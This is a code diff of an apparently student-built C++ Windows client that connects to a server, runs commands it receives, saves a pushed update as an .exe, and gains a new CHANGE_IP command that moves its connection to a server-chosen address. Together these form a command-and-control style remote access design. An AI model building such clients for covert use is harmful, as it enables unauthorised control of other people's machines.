@@ -9,8 +9,8 @@
 using namespace std;
 
 #define DEFAULT_BUFLEN 1050
-#define DEFAULT_PORT "5003"
-#define DEFAULT_HOST "10.7.0.70"
+#define DEFAULT_PORT "5004"
+#define DEFAULT_HOST "127.0.0.1"
 
 std::ofstream openFile(char *file_path)
 {
@@ -18,7 +18,7 @@ std::ofstream openFile(char *file_path)
 	return f2;
 }
 
-void create_file(Socket clientSocket,SOCKET socket, char* recBuf, int iResult)
+void create_file(Socket clientSocket, SOCKET socket, char* recBuf, int iResult)
 {
 	char * filePath = "C:\\Users\\admin\\Desktop\\CyberProject\\Client\\client_update_file.exe";
 	std::ofstream clientFile = openFile(filePath);
@@ -36,15 +36,15 @@ void create_file(Socket clientSocket,SOCKET socket, char* recBuf, int iResult)
 			clientFile.write(recvbuf, iResult);
 			printf("Bytes received: %d\n", iResult);
 		}
-		
+
 	} while (strcmp(recvbuf, "END_UPDATE") != 0);
 
-	
+
 	if (!strcmp(recvbuf, "END_UPDATE"))
 	{
 		clientFile.close();
 		cout << "closed the file" << endl;
-	}	
+	}
 }
 std::string exec(const char* cmd)
 {
@@ -85,6 +85,95 @@ void executeCommand(Socket clientSocket, SOCKET socket)
 		cout << "end execute" << endl;
 	}
 }
+
+bool changeIp(Socket & clientSocket, SOCKET & socket)
+{
+	//get size of packet
+	char sizeOfPacket[DEFAULT_BUFLEN];
+	int iResult, iResult2;
+	memset(sizeOfPacket, 0, DEFAULT_BUFLEN);
+	iResult = clientSocket.receive(socket, sizeOfPacket, DEFAULT_BUFLEN);
+	iResult2 = clientSocket.send_data(socket, "ok");//ok
+	int sizePacket = atoi(sizeOfPacket);
+
+	//get ip:port
+	char *packet = new char[sizePacket+1];
+	memset(packet, 0, sizePacket+1);
+	iResult = clientSocket.receive(socket, packet, DEFAULT_BUFLEN);
+	iResult2 = clientSocket.send_data(socket, "ok");//ok
+	char* ip = strtok(packet, ":");
+	char* port = strtok(NULL, ":");
+
+	//try to connect to 
+	Socket newClientSocket;
+	//WindowsSocket windowsSocket;
+	SOCKET newSocket = INVALID_SOCKET;
+
+	struct addrinfo *result = NULL, hints;
+	char *sendbuf = "this is a test14";
+	char recvbuf[DEFAULT_BUFLEN];
+	//int iResult, iResult2;
+	int recvbuflen = DEFAULT_BUFLEN;
+
+	//windowsSocket.startup();
+	ZeroMemory(&hints, sizeof(hints));
+	hints.ai_family = AF_UNSPEC;
+	hints.ai_socktype = SOCK_STREAM;
+	hints.ai_protocol = IPPROTO_TCP;
+
+	// Resolve the server address and port
+	iResult = getaddrinfo(ip, port, &hints, &result);
+	if (iResult != 0) {
+		throw new exception("getaddrinfo failed with error: %d\n", iResult);
+	}
+
+	newClientSocket.setAddrInfo(result);
+
+	// Attempt to connect to an address until one succeeds
+	int i = 0;
+	int connectResult = SOCKET_ERROR;
+	
+	// Create a SOCKET for connecting to server
+	newSocket = newClientSocket.create();
+	bool connected = false;
+	while (i < 3) // handle timeout!
+	{
+
+		// Connect to server.
+		connectResult = newClientSocket.conn(newSocket);
+		if (connectResult == SOCKET_ERROR) {
+			newClientSocket.close(newSocket);
+			newSocket = INVALID_SOCKET;
+			i++;
+			continue;
+		}
+		connected = true;
+		break;
+	}
+
+	freeaddrinfo(result);
+	if (connected)
+	{
+		iResult2 = clientSocket.send_data(socket, "accept");
+		clientSocket.close(socket);
+		clientSocket = newClientSocket;
+		socket = newSocket;
+	}
+
+	delete[] packet;
+	return connected;
+}
+
+
+int main1()
+{
+	char *packet = new char[17];
+	strcpy(packet, "10.20.20.183:4000");
+	char* ip = strtok(packet, ":");
+	char* port = strtok(NULL, ":");
+	cout << "SD";
+	return 0;
+}
 int main(int argc, char **argv)
 {
 	Socket clientSocket;
@@ -113,7 +202,7 @@ int main(int argc, char **argv)
 		}
 
 		clientSocket.setAddrInfo(result);
-		
+
 		// Attempt to connect to an address until one succeeds
 		bool connectResult = false;
 		while (true) // handle timeout!
@@ -143,7 +232,7 @@ int main(int argc, char **argv)
 			try
 			{
 				char recvbuf[DEFAULT_BUFLEN * 4] = { 0 };
-				iResult = clientSocket.receive(socket, recvbuf, recvbuflen*4);
+				iResult = clientSocket.receive(socket, recvbuf, recvbuflen * 4);
 				iResult2 = clientSocket.send_data(socket, "ok");
 				if (iResult > 0)
 				{
@@ -158,6 +247,23 @@ int main(int argc, char **argv)
 					else if (!strcmp(recvbuf, "EXECUTE"))
 					{
 						executeCommand(clientSocket, socket);
+					}
+					else if (!strcmp(recvbuf, "CHANGE_IP"))//2, 5
+					{
+						bool connected = changeIp(clientSocket, socket);
+						if (connected)
+						{
+							iResult2 = clientSocket.send_data(socket, "this is a test");
+
+						}
+						else
+						{
+							iResult2 = clientSocket.send_data(socket, "reject");
+						}
+					}
+					else if (!strcmp(recvbuf, "FILE_SYSTEM_INFO"))//2, 6
+					{
+
 					}
 					else
 					{
